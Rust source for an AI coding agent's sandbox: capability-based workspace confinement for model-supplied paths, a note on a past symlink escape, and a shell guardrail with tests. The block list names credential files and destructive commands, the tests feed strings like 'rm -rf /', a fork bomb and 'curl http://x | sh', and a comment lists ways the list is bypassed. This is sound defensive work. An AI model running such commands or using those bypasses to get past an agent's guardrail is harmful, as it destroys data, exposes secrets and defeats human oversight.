//! Capability-based workspace confinement, plus the cheap shell guardrail.
//!
//! ## Why `cap-std` and not a path check
//!
//! coda confined writes with a *lexical* guard: join the path onto the
//! workspace root, resolve `..` textually, and reject anything that doesn't
//! start with the root. Its own docs are candid that this "does not follow
//! symlinks — that's the kernel sandbox's job, deferred". A symlink inside the
//! workspace pointing at `/etc` defeats it entirely.
//!
//! divcli got this right: hold a [`cap_std::fs::Dir`] for the workspace root and
//! perform *every* filesystem operation through it. The OS resolves paths
//! relative to that directory descriptor and refuses to escape it, symlinks
//! included. That is the enforcement boundary here.
//!
//! The lexical check survives as a **pre-check only** — it runs first purely to
//! produce a good error message ("escapes the workspace root") instead of the
//! opaque `ENOTCAPABLE` cap-std would otherwise return. It is not what makes
//! this safe.
//!
//! A second capability covers session scratch under the OS temp directory. That
//! is still a `Dir`, not a path-string allowlist of `/tmp`. The rest of `/tmp`
//! stays closed.

use std::path::{Component, Path, PathBuf};

use cap_std::ambient_authority;
use cap_std::fs::Dir;

/// One confined directory: the Project, or session scratch.
struct Cap {
    root: PathBuf,
    dir: Dir,
}

impl Cap {
    fn open(root: &Path, label: &str) -> Result<Cap, String> {
        let canonical = root.canonicalize().map_err(|e| {
            format!(
                "{label} {} does not exist or is unreadable: {e}",
                root.display()
            )
        })?;
        if !canonical.is_dir() {
            return Err(format!(
                "{label} {} is not a directory",
                canonical.display()
            ));
        }
        let dir = Dir::open_ambient_dir(&canonical, ambient_authority())
            .map_err(|e| format!("cannot open {label} {}: {e}", canonical.display()))?;
        Ok(Cap {
            root: canonical,
            dir,
        })
    }

    /// Normalize a model-supplied path into a directory-relative one.
    fn relative(&self, path: &str, outside: &str, escapes: &str) -> Result<PathBuf, String> {
        let raw = Path::new(path);

        let stripped: PathBuf = if raw.is_absolute() {
            // Canonicalize lexically before comparing, so `/root/./a` matches.
            let normalized = lexical_normalize(raw)?;
            normalized
                .strip_prefix(&self.root)
                .map_err(|_| format!("path `{path}` is {outside} {}", self.root.display()))?
                .to_path_buf()
        } else {
            let joined = self.root.join(raw);
            let normalized = lexical_normalize(&joined)?;
            normalized
                .strip_prefix(&self.root)
                .map_err(|_| format!("path `{path}` {escapes}"))?
                .to_path_buf()
        };

        if stripped.as_os_str().is_empty() {
            return Ok(PathBuf::from("."));
        }
        Ok(stripped)
    }
}

/// A workspace root, held as a capability.
///
/// Deliberately not `Clone`: a second handle to the same root is never needed,
/// and a type that can be copied around invites one being kept past a project
/// switch — which is the mistake this file's whole `absolute_real` note is
/// about. (The doc here used to describe cloning behaviour for an impl that
/// does not exist.)
pub struct Workspace {
    project: Cap,
    /// Session scratch under the OS temp directory. Still a capability. Missing
    /// only if the directory could not be created.
    scratch: Option<Cap>,
}

impl std::fmt::Debug for Workspace {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Workspace")
            .field("root", &self.project.root)
            .field("scratch", &self.scratch.as_ref().map(|c| &c.root))
            .finish()
    }
}

impl Workspace {
    /// Open `root` as a confined workspace, plus a session scratch Dir.
    pub fn open(root: impl AsRef<Path>) -> Result<Workspace, String> {
        let project = Cap::open(root.as_ref(), "workspace")?;
        let scratch = open_scratch(&project.root);
        Ok(Workspace { project, scratch })
    }

    pub fn root(&self) -> &Path {
        &self.project.root
    }

    /// Absolute path of the session scratch directory, if it opened.
    pub fn scratch_root(&self) -> Option<&Path> {
        self.scratch.as_ref().map(|c| c.root.as_path())
    }

    /// Normalize a model-supplied path into a Project-relative one.
    ///
    /// Accepts either a relative path or an absolute path that already lies
    /// inside the root (models frequently echo back absolute paths they saw in
    /// tool output). Rejects anything that escapes, with a message the model can
    /// act on. `cap-std` will reject an escape too — this just gets there first
    /// with a better explanation.
    ///
    /// Scratch paths are not Project-relative; use the filesystem methods,
    /// which locate scratch as well.
    pub fn relative(&self, path: &str) -> Result<PathBuf, String> {
        self.project.relative(
            path,
            "outside the workspace root",
            "escapes the workspace root",
        )
    }

    fn locate(&self, path: &str) -> Result<(&Cap, PathBuf), String> {
        match self.relative(path) {
            Ok(rel) => Ok((&self.project, rel)),
            Err(project_err) => match &self.scratch {
                Some(scratch) => match scratch.relative(
                    path,
                    "outside the scratch directory",
                    "escapes the scratch directory",
                ) {
                    Ok(rel) => Ok((scratch, rel)),
                    Err(_) => Err(project_err),
                },
                None => Err(project_err),
            },
        }
    }

    /// Display form for messages back to the model: Project-relative, or the
    /// absolute scratch path.
    pub fn display_path(&self, path: &str) -> String {
        match self.locate(path) {
            Ok((cap, rel)) if cap.root == self.project.root => rel.display().to_string(),
            Ok((cap, rel)) => cap.root.join(rel).display().to_string(),
            Err(_) => path.to_string(),
        }
    }

    pub fn read_to_string(&self, path: &str) -> Result<String, String> {
        let (cap, rel) = self.locate(path)?;
        cap.dir
            .read_to_string(&rel)
            .map_err(|e| format!("cannot read `{}`: {e}", rel.display()))
    }

    pub fn write(&self, path: &str, contents: &str) -> Result<(), String> {
        let (cap, rel) = self.locate(path)?;
        if let Some(parent) = rel.parent() {
            if !parent.as_os_str().is_empty() {
                cap.dir
                    .create_dir_all(parent)
                    .map_err(|e| format!("cannot create parent of `{}`: {e}", rel.display()))?;
            }
        }
        cap.dir
            .write(&rel, contents.as_bytes())
            .map_err(|e| format!("cannot write `{}`: {e}", rel.display()))
    }

    pub fn exists(&self, path: &str) -> bool {
        match self.locate(path) {
            Ok((cap, rel)) => cap.dir.exists(&rel),
            Err(_) => false,
        }
    }

    pub fn is_dir(&self, path: &str) -> bool {
        match self.locate(path) {
            Ok((cap, rel)) => cap.dir.metadata(&rel).map(|m| m.is_dir()).unwrap_or(false),
            Err(_) => false,
        }
    }

    /// List a directory. Returns `(name, is_dir)` pairs, sorted directories-first
    /// then alphabetically, so output is deterministic across runs.
    pub fn read_dir(&self, path: &str) -> Result<Vec<(String, bool)>, String> {
        let (cap, rel) = self.locate(path)?;
        let entries = cap
            .dir
            .read_dir(&rel)
            .map_err(|e| format!("cannot list `{}`: {e}", rel.display()))?;

        let mut out = Vec::new();
        for entry in entries {
            let entry = entry.map_err(|e| format!("error reading directory entry: {e}"))?;
            let name = entry.file_name().to_string_lossy().to_string();
            let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
            out.push((name, is_dir));
        }
        out.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
        Ok(out)
    }

    /// The absolute path for a workspace-relative path.
    ///
    /// Only for handing a cwd to a subprocess or a path to a UI layer — never
    /// route a filesystem operation through this, or the capability is bypassed.
    pub fn absolute(&self, path: &str) -> Result<PathBuf, String> {
        let (cap, rel) = self.locate(path)?;
        Ok(cap.root.join(rel))
    }

    /// An absolute path for `path`, verified to be inside the workspace **after
    /// symlink resolution**.
    ///
    /// Use this, not [`absolute`](Self::absolute), for anything that will be
    /// handed to a directory walker or any other API that bypasses the `cap-std`
    /// capability. `absolute` applies only the *lexical* check — it rejects `..`
    /// and absolute ingress, and cannot see that a perfectly ordinary-looking
    /// name is a symlink to somewhere else.
    ///
    /// That was a real escape. `grep` and `glob` resolved their search root with
    /// `absolute` and handed it to `ignore::WalkBuilder`, which opens the
    /// directory through ordinary `std` calls. A symlink inside the workspace
    /// pointing out of it therefore became a searchable tree: the walker's entries
    /// came back as `<root>/link/secret.txt`, which still has the root as a
    /// textual prefix, so the confinement check those tools performed on their
    /// results passed too. `grep` for a pattern returned the contents of files
    /// outside the workspace.
    ///
    /// `follow_links(false)` does not help: it governs symlinks the walker meets
    /// as *entries*, not the root it is told to start from.
    pub fn absolute_real(&self, path: &str) -> Result<PathBuf, String> {
        let (cap, rel) = self.locate(path)?;
        let candidate = cap.root.join(rel);
        let real = candidate
            .canonicalize()
            .map_err(|e| format!("cannot resolve `{path}`: {e}"))?;
        if !real.starts_with(&cap.root) {
            return Err(format!("`{path}` resolves outside the workspace"));
        }
        Ok(real)
    }
}

/// Where this Project's session scratch lives.
///
/// Stable for a given canonical Project path so a later Session can find files
/// the last one left. Not `/tmp` itself — that would be every other process's
/// temp files.
pub fn scratch_dir_for(project: &Path) -> PathBuf {
    let canon = project
        .canonicalize()
        .unwrap_or_else(|_| project.to_path_buf());
    std::env::temp_dir()
        .join("smithy")
        .join(scratch_key(&canon))
}

fn scratch_key(project: &Path) -> String {
    let bytes = project.to_string_lossy().into_owned().into_bytes();
    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
    for b in bytes {
        hash ^= b as u64;
        hash = hash.wrapping_mul(0x0100_0000_01b3);
    }
    format!("{hash:016x}")
}

fn open_scratch(project_root: &Path) -> Option<Cap> {
    let dir = scratch_dir_for(project_root);
    std::fs::create_dir_all(&dir).ok()?;
    Cap::open(&dir, "scratch").ok()
}

/// YOLO skips Review for this write only if the path is in the Project.
///
/// Scratch (and anything else) still waits. The product claim is in-Project,
/// not "any path the tools can name".
pub fn yolo_skips_write(workspace: &Workspace, path: &str) -> bool {
    workspace.relative(path).is_ok()
}

/// YOLO skips the shell prompt only for a command that stays down in the Project.
pub fn yolo_skips_bash(command: &str, project_root: &Path) -> bool {
    !command_leaves_project(command, project_root)
}

/// How a walker result should be named, if it still sits inside a capability.
///
/// Project files are Project-relative. Scratch files are absolute, so the
/// model can `read` them without guessing the scratch root.
pub fn shown_if_contained(
    real: &Path,
    project_root: &Path,
    scratch_root: Option<&Path>,
) -> Option<String> {
    if let Ok(rel) = real.strip_prefix(project_root) {
        return Some(rel.to_string_lossy().replace('\\', "/"));
    }
    if let Some(scratch) = scratch_root {
        if real.starts_with(scratch) {
            return Some(real.to_string_lossy().replace('\\', "/"));
        }
    }
    None
}

/// Resolve `.` and `..` textually, without touching the filesystem.
fn lexical_normalize(path: &Path) -> Result<PathBuf, String> {
    let mut out = PathBuf::new();
    for comp in path.components() {
        match comp {
            Component::ParentDir => {
                if !out.pop() {
                    return Err(format!(
                        "path `{}` escapes the filesystem root",
                        path.display()
                    ));
                }
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    Ok(out)
}

// ============================================================================
// Shell guardrail
// ============================================================================

/// Destructive or exfiltrating command patterns.
///
/// **This is an accident speed-bump, not a security boundary.** A substring
/// blocklist is bypassed by `rm -r -f /`, shell expansion, or
/// `$(base64 -d <<<…)`. coda's post-mortem says so plainly, and nothing here
/// changes that. It exists to catch the literal mistake, and the real boundary
/// is [`Workspace`] for the filesystem plus the approval [`crate::ToolHook`]
/// for the shell.
const BASH_BLOCKLIST: &[&str] = &[
    ":(){",
    "mkfs",
    "dd if=",
    "of=/dev/",
    "> /dev/sd",
    "chmod -r 777 /",
    "chown -r",
    "/etc/shadow",
    "/etc/passwd",
    ".ssh/id_",
    ".aws/credentials",
    ".config/gcloud",
    "sudo ",
    "shutdown",
    "reboot",
    "diskutil ",
];

/// Recursive-delete targets that are catastrophic rather than merely local.
///
/// coda's blocklist used the bare substring `"rm -rf /"`, which flagged the
/// perfectly ordinary `rm -rf /tmp/scratch` while missing `rm -r -f /`. These
/// match a whole argument instead, so a path *prefix* like `/tmp/...` no longer
/// trips the guard and flag order no longer matters.
///
/// Entries are lowercase because the command is lowercased before matching;
/// that is why `$home` appears rather than the `$HOME` a user would type.
const CATASTROPHIC_RM_TARGETS: &[&str] = &["/", "~", "~/", ".", "..", "/*", "$home", "${home}"];

/// Screen a shell command before it runs.
pub fn check_bash(command: &str) -> Result<(), String> {
    let normalized = command
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase();

    for pat in BASH_BLOCKLIST {
        if normalized.contains(pat) {
            return Err(format!(
                "blocked by guardrail: command matches the destructive/exfil pattern `{pat}`. \
                 Refusing to run. If this is a false positive, run it yourself."
            ));
        }
    }

    if let Some(target) = catastrophic_recursive_delete(&normalized) {
        return Err(format!(
            "blocked by guardrail: this is a recursive delete of `{target}`. \
             Refusing to run. If you meant a path inside the workspace, name it explicitly."
        ));
    }

    if (normalized.contains("curl ") || normalized.contains("wget "))
        && (normalized.contains("| sh")
            || normalized.contains("|sh")
            || normalized.contains("| bash")
            || normalized.contains("|bash"))
    {
        return Err("blocked by guardrail: piping a download straight into a shell.".into());
    }

    Ok(())
}

/// Detect `rm` invocations that recursively delete a catastrophic target,
/// regardless of how the flags are spelled or ordered.
fn catastrophic_recursive_delete(normalized: &str) -> Option<String> {
    // Check each `;`/`&&`/`||`-separated segment independently.
    for segment in normalized.split([';', '&', '|']) {
        let tokens: Vec<&str> = segment.split_whitespace().collect();
        let Some(cmd_idx) = tokens.iter().position(|t| *t == "rm") else {
            continue;
        };
        let args = &tokens[cmd_idx + 1..];

        // Recursive if any short flag cluster contains `r`, or `--recursive`.
        let recursive = args.iter().any(|a| {
            *a == "--recursive" || (a.starts_with('-') && !a.starts_with("--") && a.contains('r'))
        });
        if !recursive {
            continue;
        }

        for arg in args.iter().filter(|a| !a.starts_with('-')) {
            if CATASTROPHIC_RM_TARGETS.contains(arg) {
                return Some((*arg).to_string());
            }
        }
    }
    None
}

/// Whether a shell command names a path outside the project.
///
/// YOLO uses this so `bash` that stays *down* in the Project can run without a
/// prompt, while `cd ..`, `../sibling`, `~/...`, and `/etc/...` still ask.
///
/// It is a lexical read of the command string — the same class of speed-bump as
/// [`check_bash`]. A one-liner that builds a path at runtime will not be seen.
/// Those still hit the approval prompt only if this function returns true; the
/// prompt remains the boundary.
pub fn command_leaves_project(command: &str, root: &Path) -> bool {
    for token in shell_tokens(command) {
        if token_leaves_project(&token, root) {
            return true;
        }
    }
    for fragment in parent_path_fragments(command) {
        if path_leaves_project(&fragment, root) {
            return true;
        }
    }
    for fragment in absolute_path_fragments(command) {
        if path_leaves_project(fragment, root) {
            return true;
        }
    }
    false
}

fn shell_tokens(command: &str) -> Vec<String> {
    command
        .replace(['\n', '\r', ';', '|', '&', '<', '>', '(', ')', '`'], " ")
        .split_whitespace()
        .map(|t| t.trim_matches(|c| c == '"' || c == '\'').to_string())
        .filter(|t| !t.is_empty())
        .collect()
}

fn token_leaves_project(token: &str, root: &Path) -> bool {
    if token.starts_with('-') && !token.contains('/') && !token.contains("..") {
        return false;
    }
    if looks_like_home(token) || token == ".." || token.contains('/') || token.contains('\\') {
        return path_leaves_project(token, root);
    }
    false
}

fn looks_like_home(token: &str) -> bool {
    token == "~"
        || token.starts_with("~/")
        || token.starts_with("~\\")
        || token == "$HOME"
        || token == "${HOME}"
        || token.starts_with("$HOME/")
        || token.starts_with("${HOME}/")
}

fn expand_home(path: &str) -> String {
    let home = std::env::var("HOME").unwrap_or_default();
    if home.is_empty() {
        return path.to_string();
    }
    if path == "~" || path == "$HOME" || path == "${HOME}" {
        return home;
    }
    if let Some(rest) = path.strip_prefix("~/") {
        return format!("{home}/{rest}");
    }
    if let Some(rest) = path.strip_prefix("$HOME/") {
        return format!("{home}/{rest}");
    }
    if let Some(rest) = path.strip_prefix("${HOME}/") {
        return format!("{home}/{rest}");
    }
    path.to_string()
}

fn path_leaves_project(path: &str, root: &Path) -> bool {
    let expanded = expand_home(path);
    if looks_like_home(path) && std::env::var("HOME").map(|h| h.is_empty()).unwrap_or(true) {
        // Cannot resolve home; fail closed and ask.
        return true;
    }
    let raw = Path::new(&expanded);
    let candidate = if raw.is_absolute() {
        raw.to_path_buf()
    } else {
        root.join(raw)
    };
    match lexical_normalize(&candidate) {
        Ok(normalized) => normalized.strip_prefix(root).is_err(),
        Err(_) => true,
    }
}

fn is_path_char(c: char) -> bool {
    c.is_ascii_alphanumeric()
        || matches!(
            c,
            '.' | '_' | '-' | '/' | '\\' | '+' | '%' | '@' | '~' | '$' | '{' | '}'
        )
}

fn is_parent_boundary(c: Option<char>) -> bool {
    match c {
        None => true,
        Some(c) => !is_path_char(c) || c == '/' || c == '\\',
    }
}

/// Paths that contain a `..` component, including those buried in quotes
/// (`open("../x")`).
fn parent_path_fragments(command: &str) -> Vec<String> {
    let chars: Vec<(usize, char)> = command.char_indices().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i + 1 < chars.len() {
        if chars[i].1 == '.' && chars[i + 1].1 == '.' {
            let prev = (i > 0).then(|| chars[i - 1].1);
            let next = chars.get(i + 2).map(|c| c.1);
            if is_parent_boundary(prev) && is_parent_boundary(next) {
                let mut lo = i;
                while lo > 0 && is_path_char(chars[lo - 1].1) {
                    lo -= 1;
                }
                let mut hi = i + 2;
                while hi < chars.len() && is_path_char(chars[hi].1) {
                    hi += 1;
                }
                let start = chars[lo].0;
                let end = if hi < chars.len() {
                    chars[hi].0
                } else {
                    command.len()
                };
                out.push(command[start..end].to_string());
                i = hi;
                continue;
            }
        }
        i += 1;
    }
    out
}

/// Absolute paths that start at a `/` after a non-path character, so
/// `open("/tmp/x")` is seen and `https://example.com/foo` is not.
fn absolute_path_fragments(command: &str) -> Vec<&str> {
    let chars: Vec<(usize, char)> = command.char_indices().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        if chars[i].1 == '/' {
            let prev = (i > 0).then(|| chars[i - 1].1);
            let next = chars.get(i + 1).map(|c| c.1);
            let starts = match prev {
                None => true,
                Some(c) => !is_path_char(c),
            };
            if starts && next != Some('/') {
                let begin = chars[i].0;
                let mut hi = i + 1;
                while hi < chars.len() && is_path_char(chars[hi].1) {
                    hi += 1;
                }
                let end = if hi < chars.len() {
                    chars[hi].0
                } else {
                    command.len()
                };
                out.push(&command[begin..end]);
                i = hi;
                continue;
            }
        }
        i += 1;
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn workspace() -> (tempfile::TempDir, Workspace) {
        let tmp = tempfile::tempdir().unwrap();
        fs::create_dir_all(tmp.path().join("src")).unwrap();
        fs::write(tmp.path().join("src/main.rs"), "fn main() {}\n").unwrap();
        let ws = Workspace::open(tmp.path()).unwrap();
        (tmp, ws)
    }

    #[test]
    fn reads_a_file_inside_the_workspace() {
        let (_tmp, ws) = workspace();
        assert_eq!(ws.read_to_string("src/main.rs").unwrap(), "fn main() {}\n");
    }

    #[test]
    fn rejects_parent_escape() {
        let (_tmp, ws) = workspace();
        let err = ws.read_to_string("../etc/passwd").unwrap_err();
        assert!(err.contains("escapes the workspace root"), "got: {err}");
    }

    #[test]
    fn rejects_absolute_path_outside_root() {
        let (_tmp, ws) = workspace();
        let err = ws.read_to_string("/etc/passwd").unwrap_err();
        assert!(err.contains("outside the workspace root"), "got: {err}");
    }

    #[test]
    fn accepts_absolute_path_inside_root() {
        let (_tmp, ws) = workspace();
        let abs = ws.root().join("src/main.rs");
        let got = ws.read_to_string(abs.to_str().unwrap()).unwrap();
        assert_eq!(got, "fn main() {}\n");
    }

    #[test]
    fn interior_dot_dot_that_stays_inside_is_fine() {
        let (_tmp, ws) = workspace();
        assert_eq!(
            ws.read_to_string("src/../src/main.rs").unwrap(),
            "fn main() {}\n"
        );
    }

    /// The case coda's lexical guard could not catch: a symlink that stays
    /// lexically inside the root but resolves outside it. `cap-std` refuses it.
    #[test]
    fn rejects_symlink_escape() {
        let tmp = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        fs::write(outside.path().join("secret.txt"), "TOP SECRET\n").unwrap();

        #[cfg(unix)]
        std::os::unix::fs::symlink(outside.path(), tmp.path().join("escape")).unwrap();

        let ws = Workspace::open(tmp.path()).unwrap();
        let result = ws.read_to_string("escape/secret.txt");
        assert!(
            result.is_err(),
            "symlink escape must be refused, but read returned: {result:?}"
        );
    }

    #[test]
    fn writes_create_missing_parents() {
        let (_tmp, ws) = workspace();
        ws.write("a/b/c.txt", "hello").unwrap();
        assert_eq!(ws.read_to_string("a/b/c.txt").unwrap(), "hello");
    }

    #[test]
    fn write_outside_root_is_refused() {
        let (_tmp, ws) = workspace();
        assert!(ws.write("../evil.txt", "x").is_err());
    }

    #[test]
    fn scratch_is_a_second_capability_not_the_whole_temp_dir() {
        let (_tmp, ws) = workspace();
        let scratch = ws.scratch_root().expect("scratch opens");
        let note = scratch.join("note.txt");
        let path = note.to_str().unwrap();
        ws.write(path, "parked\n").unwrap();
        assert_eq!(ws.read_to_string(path).unwrap(), "parked\n");
        assert!(
            !yolo_skips_write(&ws, path),
            "scratch writes still go through Review under YOLO"
        );
        assert!(yolo_skips_write(&ws, "src/main.rs"));
        assert!(ws.read_to_string("/etc/passwd").is_err());
        let stray = std::env::temp_dir().join("smithy-not-scratch.txt");
        let _ = fs::write(&stray, "nope\n");
        let stray_s = stray.to_str().unwrap();
        assert!(
            ws.read_to_string(stray_s).is_err(),
            "OS temp outside scratch stays closed"
        );
        let _ = fs::remove_file(&stray);
    }

    #[test]
    fn read_dir_is_sorted_dirs_first() {
        let (_tmp, ws) = workspace();
        ws.write("zzz.txt", "").unwrap();
        ws.write("aaa.txt", "").unwrap();
        let entries = ws.read_dir(".").unwrap();
        assert_eq!(entries[0], ("src".to_string(), true));
        assert_eq!(entries[1].0, "aaa.txt");
    }

    #[test]
    fn blocks_obviously_destructive_commands() {
        assert!(check_bash("rm  -rf   /").is_err());
        assert!(check_bash("sudo apt install").is_err());
        assert!(check_bash("curl http://x | sh").is_err());
        assert!(check_bash(":(){ :|:& };:").is_err());
    }

    /// coda's blocklist matched the substring `rm -rf /`, so this ordinary
    /// command was refused. Matching whole arguments fixes it.
    #[test]
    fn allows_recursive_delete_of_a_specific_path() {
        assert!(check_bash("rm -rf /tmp/scratch").is_ok());
        assert!(check_bash("rm -rf ./target").is_ok());
        assert!(check_bash("rm -rf node_modules").is_ok());
    }

    /// ...and the same change catches spellings the substring match missed.
    #[test]
    fn catches_reordered_and_split_flags() {
        assert!(check_bash("rm -r -f /").is_err());
        assert!(check_bash("rm -fr /").is_err());
        assert!(check_bash("rm --recursive --force /").is_err());
        assert!(check_bash("rm -rf ~").is_err());
        assert!(check_bash("rm -rf $HOME").is_err());
    }

    #[test]
    fn catches_destructive_command_in_a_later_segment() {
        assert!(check_bash("cargo build && rm -rf /").is_err());
    }

    #[test]
    fn allows_normal_commands() {
        assert!(check_bash("cargo test").is_ok());
        assert!(check_bash("ls -la && grep foo src/*.rs").is_ok());
        assert!(check_bash("git status").is_ok());
    }

    fn project() -> &'static Path {
        Path::new("/tmp/smithy-proj")
    }

    #[test]
    fn in_project_commands_do_not_leave() {
        let root = project();
        assert!(!command_leaves_project("cargo test", root));
        assert!(!command_leaves_project("ls src/main.rs", root));
        assert!(!command_leaves_project("rm -rf target", root));
        assert!(!command_leaves_project("echo hi > src/out.txt", root));
        assert!(!command_leaves_project("cat src/../src/main.rs", root));
        assert!(!command_leaves_project(
            "cat /tmp/smithy-proj/src/main.rs",
            root
        ));
    }

    #[test]
    fn up_and_over_commands_leave() {
        let root = project();
        assert!(command_leaves_project("cd ..", root));
        assert!(command_leaves_project("cd .. && ls", root));
        assert!(command_leaves_project("echo x > ../out.txt", root));
        assert!(command_leaves_project("rm ../secret", root));
        assert!(command_leaves_project("cat /etc/hosts", root));
        assert!(command_leaves_project(
            "python -c 'open(\"../x\",\"w\")'",
            root
        ));
        assert!(command_leaves_project(
            "python -c 'open(\"/tmp/x\",\"w\")'",
            root
        ));
    }

    #[test]
    fn home_paths_leave_unless_the_project_is_home() {
        let root = project();
        assert!(command_leaves_project("cat ~/.bashrc", root));
        assert!(command_leaves_project("cat $HOME/.bashrc", root));
        let home = std::env::var("HOME").unwrap_or_default();
        if !home.is_empty() {
            assert!(
                !command_leaves_project("cat ~/.bashrc", Path::new(&home)),
                "opening ~ as the Project must not trip YOLO"
            );
        }
    }
}
